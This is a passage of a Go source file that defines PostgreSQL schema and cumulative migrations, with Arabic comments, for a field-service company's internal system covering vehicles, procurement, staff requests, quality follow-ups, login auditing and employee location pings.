	`CREATE TABLE IF NOT EXISTS "MissionEvent" (
		id TEXT PRIMARY KEY,
		"missionId" TEXT NOT NULL REFERENCES "Mission"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL,
		action TEXT NOT NULL,
		lat DOUBLE PRECISION,
		lng DOUBLE PRECISION,
		note TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "MissionEvent_missionId_idx" ON "MissionEvent"("missionId")`,
	`CREATE TABLE IF NOT EXISTS "Project" (
		id TEXT PRIMARY KEY,
		code TEXT NOT NULL UNIQUE,
		name TEXT NOT NULL,
		rep TEXT,
		phone TEXT,
		location TEXT,
		"workType" TEXT,
		"refPerson" TEXT,
		stage TEXT NOT NULL DEFAULT '1. اتصال بالزبون',
		price TEXT,
		staff TEXT,
		time TEXT,
		task TEXT,
		priority TEXT NOT NULL DEFAULT 'عادي',
		"deliveryDate" TEXT,
		survey JSONB,
		"sentToGroup" BOOLEAN NOT NULL DEFAULT false,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"updatedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Project_stage_idx" ON "Project"(stage)`,
	`CREATE TABLE IF NOT EXISTS "ProcurementRequest" (
		id TEXT PRIMARY KEY,
		code TEXT NOT NULL UNIQUE,
		"requestedById" TEXT NOT NULL REFERENCES "Employee"(id),
		"bookingId" TEXT REFERENCES "Booking"(id),
		notes TEXT,
		status "ProcurementRequestStatus" NOT NULL DEFAULT 'PENDING',
		"fulfilledById" TEXT REFERENCES "Employee"(id),
		"totalCost" DOUBLE PRECISION,
		"fulfillmentNotes" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"fulfilledAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "ProcurementRequest_requestedById_idx" ON "ProcurementRequest"("requestedById")`,
	`CREATE INDEX IF NOT EXISTS "ProcurementRequest_status_idx" ON "ProcurementRequest"(status)`,
	`CREATE TABLE IF NOT EXISTS "ProcurementItem" (
		id TEXT PRIMARY KEY,
		"requestId" TEXT NOT NULL REFERENCES "ProcurementRequest"(id) ON DELETE CASCADE,
		"productName" TEXT NOT NULL,
		quantity INTEGER NOT NULL,
		"unitPrice" DOUBLE PRECISION,
		"totalPrice" DOUBLE PRECISION,
		fulfilled BOOLEAN NOT NULL DEFAULT false
	)`,
	`CREATE INDEX IF NOT EXISTS "ProcurementItem_requestId_idx" ON "ProcurementItem"("requestId")`,
}

// migrations تعديلات تراكمية على البنية الأساسية — تُطبَّق تلقائياً كل مرة يشتغل
// فيها السيرفر حتى ما يحتاج أي شخص يشغّل ملفات SQL يدوياً.
var migrations = []string{
	`ALTER TABLE "Customer" ADD COLUMN IF NOT EXISTS "mapLatitude" DOUBLE PRECISION`,
	`ALTER TABLE "Customer" ADD COLUMN IF NOT EXISTS "mapLongitude" DOUBLE PRECISION`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "isTrainee" BOOLEAN NOT NULL DEFAULT false`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "shiftStart" TEXT`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "shiftEnd" TEXT`,

	// وقت تجهيز المواد (يحدده تيم ليدر الفريق) ومدة استجابة الفنيين بعده لحد ما يبدون
	// الشغل فعلياً — حتى نعرف مين ضيّع وقت بدل ما يتحرك مباشرة.
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "materialsReadyAt" TIMESTAMP`,
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "materialsReadyById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "responseMinutes" INTEGER`,

	// جدول متابعة المركبات: وقود، تنظيف، تبديل زيت — سجل واحد لكل حدث، مع موعد الاستحقاق
	// الجاي (nextDueAt) حتى نقدر نبني جدول مواعيد متكرر من فوقه.
	`CREATE TABLE IF NOT EXISTS "VehicleLog" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		type TEXT NOT NULL,
		"performedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"nextDueAt" TIMESTAMP,
		odometer INTEGER,
		cost DOUBLE PRECISION,
		notes TEXT,
		"recordedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleLog_vehicleId_idx" ON "VehicleLog"("vehicleId")`,

	// أعطال وأضرار (صدمات) لكل سيارة، مع تحديد المسبب والتكلفة وحالة المعالجة.
	`CREATE TABLE IF NOT EXISTS "VehicleIncident" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		type TEXT NOT NULL,
		description TEXT NOT NULL,
		"responsibleEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		cost DOUBLE PRECISION,
		status TEXT NOT NULL DEFAULT 'OPEN',
		"reportedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleIncident_vehicleId_idx" ON "VehicleIncident"("vehicleId")`,

	// تقرير حالة شهري لكل سيارة (فيها مشكلة هذا الشهر؟ انعالجت لو لا؟)
	`CREATE TABLE IF NOT EXISTS "VehicleMonthlyStatus" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		month TEXT NOT NULL,
		"hasIssue" BOOLEAN NOT NULL DEFAULT false,
		"issueDescription" TEXT,
		resolved BOOLEAN NOT NULL DEFAULT false,
		notes TEXT,
		"recordedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("vehicleId", month)
	)`,

	// جرد الأدوات اليومي: الفني يؤكد جرد عدته الخاصة قبل ما يطلع للحجز، والإداري يشوف
	// نتائج كل الفنيين بيوم واحد حتى يوفر البديل بحال اكو نقص.
	`CREATE TABLE IF NOT EXISTS "InventoryCheck" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		complete BOOLEAN NOT NULL,
		"missingItems" TEXT,
		"checkedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "InventoryCheck_employeeId_idx" ON "InventoryCheck"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "InventoryCheck_checkedAt_idx" ON "InventoryCheck"("checkedAt")`,

	// وحدة الجودة: مشاكل تنفيذية ميدانية + مشاكل رقابية/إدارية، مع تحديد المسؤول.
	`CREATE TABLE IF NOT EXISTS "QualityIssue" (
		id TEXT PRIMARY KEY,
		category TEXT NOT NULL,
		title TEXT NOT NULL,
		description TEXT,
		"responsibleEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"reportedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL,
		status TEXT NOT NULL DEFAULT 'OPEN',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "QualityIssue_status_idx" ON "QualityIssue"(status)`,

	// دور GPS_ENGINEER اتلغى — تركيب GPS صار مهارة عادية (مثل باقي الخدمات) يمنحها
	// الأدمن لأي فني عادي بدل ما يكون دور مستقل. "أبو الجي بي اس" (GPS_ADMIN) هو
	// الدور الوحيد الخاص بـGPS اللي بقى، ويرتب موعد الزبون لطلبات GPS الجديدة.
	`ALTER TABLE "GpsDeviceRequest" ADD COLUMN IF NOT EXISTS "scheduledAt" TIMESTAMP`,
	`ALTER TABLE "GpsDeviceRequest" ADD COLUMN IF NOT EXISTS "assignedTechnicianId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,

	// طلبات الكادر: مدير المشاريع يطلب موظفين محددين من كادر الشد بوقت ومدة محددة،
	// والطلب يروح لإدارة الكوادر (HR) حتى تلبيه — هو الأعلى صلاحية عليهم.
	`CREATE TABLE IF NOT EXISTS "StaffRequest" (
		id TEXT PRIMARY KEY,
		"requesterId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"projectId" TEXT REFERENCES "Project"(id) ON DELETE SET NULL,
		"neededAt" TIMESTAMP NOT NULL,
		"durationHours" DOUBLE PRECISION NOT NULL DEFAULT 8,
		notes TEXT,
		status TEXT NOT NULL DEFAULT 'PENDING',
		"handledById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"handledAt" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "StaffRequestEmployee" (
		id TEXT PRIMARY KEY,
		"requestId" TEXT NOT NULL REFERENCES "StaffRequest"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		UNIQUE ("requestId", "employeeId")
	)`,
	`CREATE INDEX IF NOT EXISTS "StaffRequest_status_idx" ON "StaffRequest"(status)`,
	`CREATE INDEX IF NOT EXISTS "StaffRequest_requesterId_idx" ON "StaffRequest"("requesterId")`,

	// ربط المشروع بالحجز الأصلي: الحجوزات الكبيرة اللي يحولها إداري الكوادر لإدارة
	// المشاريع تنشأ منها مشاريع، وهذا العمود يمنع عرض نفس الحجز مرتين كمقترح مشروع.
	`ALTER TABLE "Project" ADD COLUMN IF NOT EXISTS "bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL`,

	// دور "مهندس" (ENGINEER) الجديد — يشترط أربع مهارات هندسية أساسية قبل ما ينعطى
	// له الدور (تصميم/تخطيط/تنفيذ/إشراف)، التحقق نفسه بمنطق Go لأنه شرط عمل مو بنية جدول.
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'ENGINEER'`,
	// دور "المالك" (OWNER) — حساب واحد فقط، أقوى من ADMIN، يتخطى كل قيود
	// الأدوار والصلاحيات (middleware.RequireRole/RequirePermission).
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'OWNER'`,
	// دور "إداري الكميات" (PROCUREMENT_ADMIN) — يستلم طلبات المواد الناقصة من الموظفين
	// ويوفرها ويسجل كلفتها (نظام المشتريات الموجود أصلاً)، بدون صلاحيات إضافية افتراضية —
	// تُمنح له لاحقاً من صفحة الصلاحيات حسب الحاجة.
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'PROCUREMENT_ADMIN'`,
	// دور "مصمم" (DESIGNER) — بدون صلاحيات إضافية افتراضية، تُمنح له لاحقاً من صفحة
	// الصلاحيات حسب الحاجة، نفس نمط "إداري الكميات".
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'DESIGNER'`,
	// دور "مسؤول خدمة" (SERVICE_MANAGER) — المسؤول عن متابعة خدمة معينة (جي بي اس،
	// كاميرات...) وتوجيه كوادرها، بدون صلاحيات إضافية افتراضية — تُمنح له لاحقاً من
	// صفحة الصلاحيات حسب الخدمة الي يديرها.
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'SERVICE_MANAGER'`,
	// حالتين جديدتين للموظف: أرشفة (قابلة للاسترجاع) وحذف (سجل ناعم) — الاثنين
	// يختفون من كل واجهات النظام العادية، الأدمن/المالك بس يشوف تاريخهم.
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'ARCHIVED'`,
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'DELETED'`,
	// حماية من التلاعب بجلسة تسجيل الدخول من أدوات المطورين بالمتصفح: لو حساب
	// عادي حاول يوصل لعملية أو مسار مو مسموحله بيه (بعد تعديل بيانات الجلسة
	// بالمتصفح مثلاً)، الباك إند يرفضه دائماً (الدور الحقيقي من التوكن الموقّع
	// وليس من أي شي يرسله المتصفح) ويسجل "محاولة اختراق" — إذا تكررت 3 مرات
	// نوقف الحساب تلقائياً (status = SUSPENDED) ويصير ميكدر يستخدم النظام
	// حتى لو رجع يسجل دخول بكلمة سره الصحيحة.
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'SUSPENDED'`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "authzViolations" INT NOT NULL DEFAULT 0`,

	// سجل تدقيق تسجيل الدخول: كل محاولة دخول (ناجحة أو فاشلة) تنسجل هنا مع
	// عنوان IP والمتصفح/الجهاز — أساس لوحة المراقبة الأمنية الخلفية.
	// ملاحظة: المتصفح لا يقدر تقنياً يكشف عنوان MAC الفعلي لأي جهاز (قيد أمان
	// بكل المتصفحات الحديثة)، فالتتبع يعتمد على IP + بصمة المتصفح/الجهاز.
	`CREATE TABLE IF NOT EXISTS "LoginAudit" (
		id TEXT PRIMARY KEY,
		username TEXT NOT NULL,
		"employeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		success BOOLEAN NOT NULL,
		"ipAddress" TEXT,
		"userAgent" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "LoginAudit_employeeId_idx" ON "LoginAudit"("employeeId", "createdAt")`,
	`CREATE INDEX IF NOT EXISTS "LoginAudit_createdAt_idx" ON "LoginAudit"("createdAt")`,

	// نوع الشكوى (قائمة منسدلة ثابتة بدل وصف حر) + الموظف المتسبب (اختياري)
	`ALTER TABLE "Complaint" ADD COLUMN IF NOT EXISTS "type" TEXT NOT NULL DEFAULT 'OTHER'`,
	`ALTER TABLE "Complaint" ADD COLUMN IF NOT EXISTS "relatedEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,
	// اسم احتياطي (نص) للموظف المتسبب لما يكون سجل تاريخي مستورد من نظام قديم
	// وما عنده حساب فعلي بالنظام الجديد بعد — نفس فكرة "confirmedByName" بجدول الحجوزات.
	`ALTER TABLE "Complaint" ADD COLUMN IF NOT EXISTS "relatedEmployeeName" TEXT`,

	// فهرس على تاريخ إنشاء الحجز — الصفحة الرئيسية للحجوزات تفرز حسب هذا العمود،
	// وبدون فهرس الفرز يصير بطيء جداً مع زيادة عدد الحجوزات (خصوصاً بعد استيراد البيانات التاريخية).
	`CREATE INDEX IF NOT EXISTS "Booking_createdAt_idx" ON "Booking"("createdAt" DESC)`,
	`CREATE INDEX IF NOT EXISTS "Booking_customerId_idx" ON "Booking"("customerId")`,
	`CREATE INDEX IF NOT EXISTS "Booking_status_idx" ON "Booking"(status)`,

	// وسم الخدمة على الزبون — نفس الزبون (بنفس الكود الموحّد CUST-xxxxx) ممكن يكون
	// عنده أكثر من وسم (جي بي اس، كاميرات، طاقة شمسية...) حسب الخدمات الي طلبها،
	// يستخدم لعرض "زبائن الجي بي اس" وحدهم من ضمن قائمة الزبائن الكلية بدون أي كود منفصل.
	`CREATE TABLE IF NOT EXISTS "CustomerServiceTag" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL REFERENCES "Customer"(id) ON DELETE CASCADE,
		service TEXT NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("customerId", service)
	)`,
	`CREATE INDEX IF NOT EXISTS "CustomerServiceTag_customerId_idx" ON "CustomerServiceTag"("customerId")`,
	`CREATE INDEX IF NOT EXISTS "CustomerServiceTag_service_idx" ON "CustomerServiceTag"(service)`,

	// معلومات إضافية خاصة بزبائن الجي بي اس فقط (مستوردة من نظام التتبع القديم) —
	// جدول منفصل حتى ما نثقل جدول Customer العام بحقول ما تخص كل الزبائن.
	`CREATE TABLE IF NOT EXISTS "CustomerGpsInfo" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL UNIQUE REFERENCES "Customer"(id) ON DELETE CASCADE,
		"gpsNumber" TEXT,
		"deviceId" TEXT,
		"subscriptionEnd" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,

	// إرجاع نقطة كي بي اي: ما نحذفها نهائياً — نعلّمها "ملغاة" حتى يضل تاريخها
	// موجود ويشوفه المراقب، بس تأثيرها المالي (deductionAmount) يوقف يحسب.
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS cancelled BOOLEAN NOT NULL DEFAULT false`,
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS "cancelledAt" TIMESTAMP`,
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS "cancelledByEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,

	// نقاط الكي بي اي صارت قابلة للإضافة والحذف من الواجهة (صلاحية منفصلة)
	// بدل ما تكون مثبتة بالكود.
	`CREATE TABLE IF NOT EXISTS "KpiCriterion" (
		id TEXT PRIMARY KEY,
		label TEXT NOT NULL UNIQUE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,

	// "مسؤول خدمة" عام: تعميم فكرة أبو الجي بي اس لأي مجموعة خدمات — جدول يربط موظف
	// بمجموعة خدمات هو المسؤول الوحيد عن تفعيلها/جدولتها (مثال: GPS + صوتيات + حريق سوا).
	`CREATE TABLE IF NOT EXISTS "ServiceManager" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"serviceId" TEXT NOT NULL REFERENCES "Service"(id) ON DELETE CASCADE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", "serviceId")
	)`,
	`CREATE INDEX IF NOT EXISTS "ServiceManager_employeeId_idx" ON "ServiceManager"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "ServiceManager_serviceId_idx" ON "ServiceManager"("serviceId")`,

	// تتبع موقع الفني الحي وهو ماشي للزبون — يلتقط المتصفح موقعه دورياً أثناء فتح
	// الصفحة، ونخزن آخر نقطة + سجل المسار (لعرضه على الخريطة بمتابعة الفرق الميدانية).
	`CREATE TABLE IF NOT EXISTS "LocationPing" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL,
		latitude DOUBLE PRECISION NOT NULL,
		longitude DOUBLE PRECISION NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "LocationPing_employeeId_idx" ON "LocationPing"("employeeId", "createdAt")`,

	// تقييم الأداء (منفصل تماماً عن KPI مال الغرامات المالية) — يحدد هل الموظف يستحق
	// تدريب أو لا. التيم ليدر يقيّم فنييه، والإداري يقيّم التيم ليدر نفسه.
	`CREATE TABLE IF NOT EXISTS "PerformanceReview" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"evaluatorId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		rating TEXT NOT NULL,
		reason TEXT NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "PerformanceReview_employeeId_idx" ON "PerformanceReview"("employeeId")`,

	// متابعة الجودة: كل حجز يكتمل (COMPLETED) ينشئ سطر هنا تلقائياً حتى مهندس الجودة
	// يتواصل مع الزبون ويتأكد ما اكو مشاكل. "status" يتحول من PENDING إلى CONTACTED_OK
	// أو CONTACTED_ISSUE بعد التواصل، أو CONVERTED إذا حوّلها المهندس لحجز جديد.
	`CREATE TABLE IF NOT EXISTS "QualityFollowUp" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id) ON DELETE CASCADE,
		"customerId" TEXT NOT NULL REFERENCES "Customer"(id) ON DELETE CASCADE,
		status TEXT NOT NULL DEFAULT 'PENDING',
		"contactNotes" TEXT,
		"contactedByEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"contactedAt" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE UNIQUE INDEX IF NOT EXISTS "QualityFollowUp_bookingId_key" ON "QualityFollowUp"("bookingId")`,
	`CREATE INDEX IF NOT EXISTS "QualityFollowUp_status_idx" ON "QualityFollowUp"(status)`,

	// تأشير "تم" على نقص جرد الفني — يسويها الإداري/الأدمن بعد ما يوفر البديل، حتى
	// المراقب يشوف مين وفّر الاحتياج ومتى (بدون صلاحية تعديل، عرض بس).
	`ALTER TABLE "InventoryCheck" ADD COLUMN IF NOT EXISTS "resolved" BOOLEAN NOT NULL DEFAULT false`,
	`ALTER TABLE "InventoryCheck" ADD COLUMN IF NOT EXISTS "resolvedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,
	`ALTER TABLE "InventoryCheck" ADD COLUMN IF NOT EXISTS "resolvedAt" TIMESTAMP`,

	// إشعارات الموظفين — تصدر الترتيب، خصم نقاط الكي بي اي، وأي تنبيهات مستقبلية.
	`CREATE TABLE IF NOT EXISTS "Notification" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		type TEXT NOT NULL,
		message TEXT NOT NULL,
		read BOOLEAN NOT NULL DEFAULT false,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Notification_employeeId_idx" ON "Notification"("employeeId", "createdAt" DESC)`,

	// تقييم يومي لنظافة/حالة السيارة (11 بند 0-4) + جودة غسيل الفني (0-2) — مقتبس
	// من ملف إكسل الشركة. النتائج تذكير للمراقب بس، بدون أي ربط تلقائي بالراتب.
	`CREATE TABLE IF NOT EXISTS "VehicleDailyRating" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		"ratedDate" DATE NOT NULL DEFAULT CURRENT_DATE,
		wash INT,
		"exteriorClean" INT,
		"exteriorCondition" INT,
		"tireCondition" INT,
		"glassClean" INT,
		"lightsCondition" INT,
		"technicalFaults" INT,
		"faultDescription" TEXT,
		"interiorClean" INT,
		"seatsCondition" INT,
		"interiorDirt" INT,
		smell INT,
		notes TEXT,
		"recordedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleDailyRating_vehicleId_idx" ON "VehicleDailyRating"("vehicleId", "ratedDate" DESC)`,
	`CREATE TABLE IF NOT EXISTS "VehicleWashRating" (
		id TEXT PRIMARY KEY,
		"dailyRatingId" TEXT NOT NULL REFERENCES "VehicleDailyRating"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		score INT NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleWashRating_dailyRatingId_idx" ON "VehicleWashRating"("dailyRatingId")`,
	`CREATE INDEX IF NOT EXISTS "VehicleWashRating_employeeId_idx" ON "VehicleWashRating"("employeeId")`,

	// تقسيم طلبات المشتريات لنوعين مستقلين بالصلاحية: احتياجات شخصية للموظف
	// نفسه (PERSONAL_SUPPLY) مقابل طلب منتج للزبون (CUSTOMER_PRODUCT، وهو النوع
	// الأصلي القديم لذلك القيمة الافتراضية تحافظ على الصفوف الموجودة).
	`ALTER TABLE "ProcurementRequest" ADD COLUMN IF NOT EXISTS "requestType" TEXT NOT NULL DEFAULT 'CUSTOMER_PRODUCT'`,

	// ملف السيارة الكامل: موديل، سنة صنع، أرقام شاصي/محرك، نوع وقود، عداد
	// كيلومترات حالي (يتحدث تلقائياً من نظام المهمة، مع إمكانية تعديل يدوي
	// كخيار احتياطي)، وحالة السيارة الحالية.
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS model TEXT`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS year INTEGER`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS "chassisNumber" TEXT`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS "engineNumber" TEXT`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS "fuelType" TEXT`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS "currentOdometer" INTEGER NOT NULL DEFAULT 0`,
	`ALTER TABLE "Vehicle" ADD COLUMN IF NOT EXISTS condition TEXT`,

	// وثائق السيارة: تأمين، إجازة سنوية، فحص دوري... إلخ.
	`CREATE TABLE IF NOT EXISTS "VehicleDocument" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		"documentType" TEXT NOT NULL,
		"documentNumber" TEXT,
		"issueDate" TIMESTAMP,
		"expiryDate" TIMESTAMP,
		"fileUrl" TEXT,
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleDocument_vehicleId_idx" ON "VehicleDocument"("vehicleId")`,

	// صور السيارة (معرض صور عام للسيارة).
	`CREATE TABLE IF NOT EXISTS "VehiclePhoto" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		url TEXT NOT NULL,
		caption TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehiclePhoto_vehicleId_idx" ON "VehiclePhoto"("vehicleId")`,

	// نظام المهمة: كل خروج سيارة يصير سجل مهمة (سبب، وجهة، عداد بداية/نهاية،
	// مسافة محسوبة، ركاب مرافقين) بدل سجل خروج/دخول مجرد.
	`CREATE TABLE IF NOT EXISTS "VehicleMission" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id),
		"driverId" TEXT NOT NULL REFERENCES "Employee"(id),
		purpose TEXT NOT NULL,
		destination TEXT NOT NULL,
		"startedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"endedAt" TIMESTAMP,
		"startOdometer" INTEGER NOT NULL,
		"endOdometer" INTEGER,
		"distanceKm" INTEGER,
		notes TEXT,
		status TEXT NOT NULL DEFAULT 'IN_PROGRESS',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleMission_vehicleId_idx" ON "VehicleMission"("vehicleId")`,
	`CREATE INDEX IF NOT EXISTS "VehicleMission_driverId_idx" ON "VehicleMission"("driverId")`,
	`CREATE INDEX IF NOT EXISTS "VehicleMission_status_idx" ON "VehicleMission"("status")`,

	// الموظفين المرافقين بالمهمة (يُعلَنون عند بدء المهمة).
	`CREATE TABLE IF NOT EXISTS "VehicleMissionPassenger" (
		id TEXT PRIMARY KEY,
		"missionId" TEXT NOT NULL REFERENCES "VehicleMission"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		UNIQUE("missionId", "employeeId")
	)`,
}

func Migrate(db *sqlx.DB) error {
	for _, stmt := range baseSchema {
		if _, err := db.Exec(stmt); err != nil {
			return err
		}
	}
	for _, stmt := range migrations {
		if _, err := db.Exec(stmt); err != nil {
			return err
		}
	}
	if err := migrateGpsEngineersToSkill(db); err != nil {
		return err
	}
	if err := seedEngineeringSkills(db); err != nil {
		return err
	}
	if err := seedLegacySkills(db); err != nil {
		return err
	}
	if err := seedDefaultSkillForServices(db); err != nil {
		return err
	}
	if err := grantGpsSystemToMonitors(db); err != nil {
		return err
	}
	if err := grantRolePermission(db, "PROCUREMENT_ADMIN", "procurement", "المشتريات"); err != nil {
		return err
	}
	if err := grantRolePermission(db, "PROCUREMENT_ADMIN", "inventory", "جرد الأدوات"); err != nil {
		return err
	}
	if err := seedOwnerAccount(db); err != nil {
		return err
	}
	if err := seedKpiCriteria(db); err != nil {
		return err
	}
	return dropAttendanceDailyUniqueConstraint(db)
}

// dropAttendanceDailyUniqueConstraint يشيل قيد UNIQUE(employeeId, date) عن جدول
// "Attendance" — هذا القيد كان يمنع الموظف من تسجيل أكثر من جلسة حضور
// (دخول/خروج) بنفس اليوم. نلگي اسم القيد الحقيقي من information_schema بدل
// افتراض اسمه (idempotent — إذا القيد مو موجود ما تصير أي عملية).
func dropAttendanceDailyUniqueConstraint(db *sqlx.DB) error {
	_, err := db.Exec(`
		DO $$
		DECLARE
			constraint_name text;
			index_name text;
		BEGIN
			-- Case 1: a real UNIQUE table constraint on (employeeId, date).
			SELECT tc.constraint_name INTO constraint_name
